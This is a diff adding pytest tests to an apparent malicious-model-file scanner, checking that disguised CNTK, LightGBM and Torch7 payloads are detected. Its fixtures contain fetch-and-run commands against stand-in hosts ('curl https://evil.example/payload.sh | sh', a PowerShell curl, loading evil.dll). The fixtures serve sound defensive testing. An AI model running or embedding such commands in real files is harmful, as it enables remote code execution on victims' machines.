@@ -158,6 +158,25 @@ def _create_misnamed_zip(path: Path, entries: dict[str, bytes]) -> None:
             archive.writestr(name, data)
 
 
+def _write_malicious_cntk(path: Path, include_structure: bool = True) -> None:
+    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
+    structure = b" CompositeFunction primitive_functions " if include_structure else b""
+    payload = b" native_user_function loadlibrary C:\\temp\\evil.dll powershell -c curl http://evil.example/p.sh "
+    path.write_bytes(prefix + structure + payload)
+
+
+def _write_malicious_lightgbm(path: Path, valid: bool = True) -> None:
+    body = "tree=0\nversion=v4\nnum_class=1\n"
+    if valid:
+        body += (
+            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\nnum_leaves=2\n"
+            "split_feature=0\nleaf_value=0.1 0.2\n"
+            "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')\n"
+            "callback_url=https://collector.evil.example/payload.sh\n"
+        )
+    path.write_text(body, encoding="utf-8")
+
+
 def _create_zip_with_ordered_entries(path: Path, entries: list[tuple[str, bytes]]) -> None:
     """Write a ZIP archive with duplicate entries in caller-defined order."""
     with zipfile.ZipFile(path, "w") as archive:
@@ -873,6 +892,53 @@ def test_scan_file_detects_malicious_zip_with_misleading_extension(tmp_path: Pat
 
     assert result.scanner_name == "zip"
     _assert_system_pickle_detected(result, "payload.pkl")
+
+
+def test_scan_file_routes_malicious_cntk_with_misleading_extension(tmp_path: Path) -> None:
+    disguised_cntk = tmp_path / "payload.jpg"
+    _write_malicious_cntk(disguised_cntk)
+
+    result = scan_file(str(disguised_cntk))
+
+    assert result.scanner_name == "cntk"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_file_routes_malicious_lightgbm_with_misleading_extension(tmp_path: Path) -> None:
+    disguised_lightgbm = tmp_path / "payload.jpg"
+    _write_malicious_lightgbm(disguised_lightgbm)
+
+    result = scan_file(str(disguised_lightgbm))
+
+    assert result.scanner_name == "lightgbm"
+    assert any(
+        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_file_routes_malicious_lightgbm_with_binary_prelude(tmp_path: Path) -> None:
+    disguised_lightgbm = tmp_path / "binary-payload.jpg"
+    _write_malicious_lightgbm(disguised_lightgbm)
+    disguised_lightgbm.write_bytes(b"\x01opaque tree prelude\x00" + disguised_lightgbm.read_bytes())
+
+    result = scan_file(str(disguised_lightgbm))
+
+    assert result.scanner_name == "lightgbm"
+    assert any(
+        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_file_does_not_route_cntk_or_lightgbm_near_matches(tmp_path: Path) -> None:
+    cntk_near_match = tmp_path / "cntk-near-match.jpg"
+    lightgbm_near_match = tmp_path / "lightgbm-near-match.jpg"
+    _write_malicious_cntk(cntk_near_match, include_structure=False)
+    _write_malicious_lightgbm(lightgbm_near_match, valid=False)
+
+    assert scan_file(str(cntk_near_match)).scanner_name == "unknown"
+    assert scan_file(str(lightgbm_near_match)).scanner_name == "unknown"
 
 
 @pytest.mark.parametrize("suffix", [".flax", ".orbax", ".jax"])
@@ -1911,6 +1977,17 @@ def test_scan_file_routes_misnamed_gguf_by_header(tmp_path: Path) -> None:
     assert result.metadata["format"] == "gguf"
 
 
+def test_scan_file_routes_misnamed_ggml_by_header(tmp_path: Path) -> None:
+    disguised_ggml = tmp_path / "model.payload"
+    disguised_ggml.write_bytes(b"GGML" + (1).to_bytes(4, "little") + b"\x00" * 24)
+
+    result = scan_file(str(disguised_ggml))
+
+    assert result.scanner_name == "gguf"
+    assert result.metadata["format"] == "ggml"
+    assert result.metadata["version"] == 1
+
+
 def test_scan_file_routes_gguf_chat_templates_through_jinja_analysis(tmp_path: Path) -> None:
     gguf_path = create_mock_gguf(
         tmp_path / "model.gguf",
@@ -1962,6 +2039,33 @@ def test_scan_file_detects_malicious_torch7_with_misleading_suffix(tmp_path: Pat
         b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
         b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
     )
+
+    result = scan_file(str(disguised_torch7))
+
+    assert result.scanner_name == "torch7"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+@pytest.mark.parametrize("embedded_format", ["cntk", "lightgbm"])
+def test_scan_file_prioritizes_malicious_torch7_over_embedded_content_signatures(
+    tmp_path: Path,
+    embedded_format: str,
+) -> None:
+    disguised_torch7 = tmp_path / f"payload-{embedded_format}.jpg"
+    payload = (
+        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+    if embedded_format == "cntk":
+        embedded_payload = tmp_path / "embedded.cmf"
+        _write_malicious_cntk(embedded_payload)
+        payload += embedded_payload.read_bytes()
+    else:
+        embedded_payload = tmp_path / "embedded.lgb"
+        _write_malicious_lightgbm(embedded_payload)
+        payload += b"\x00" + embedded_payload.read_bytes()
+    disguised_torch7.write_bytes(payload)
 
     result = scan_file(str(disguised_torch7))
 
@@ -2407,6 +2511,23 @@ def test_scan_file_routes_readme_documentation_to_metadata_scanner(tmp_path: Pat
 
     assert result.scanner_name == "metadata"
     assert result.success is True
+
+
+@pytest.mark.parametrize("leading_line", ["tree model notes", "tree=implementation notes"])
+def test_scan_file_keeps_tree_prefixed_readme_on_metadata_scanner(tmp_path: Path, leading_line: str) -> None:
+    readme_path = tmp_path / "README.md"
+    readme_path.write_text(
+        f"{leading_line}\n"
+        "tree=0\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
+        "tree_sizes=12\nnum_leaves=2\nsplit_feature=0\nleaf_value=0.1 0.2\n"
+        f"API Key: sk-{'A' * 48}\n",
+        encoding="utf-8",
+    )
+
+    result = scan_file(str(readme_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "metadata"
+    assert any(issue.severity == IssueSeverity.INFO for issue in result.issues)
 
 
 def test_scan_file_routes_model_config_json_to_manifest_scanner(tmp_path: Path) -> None:
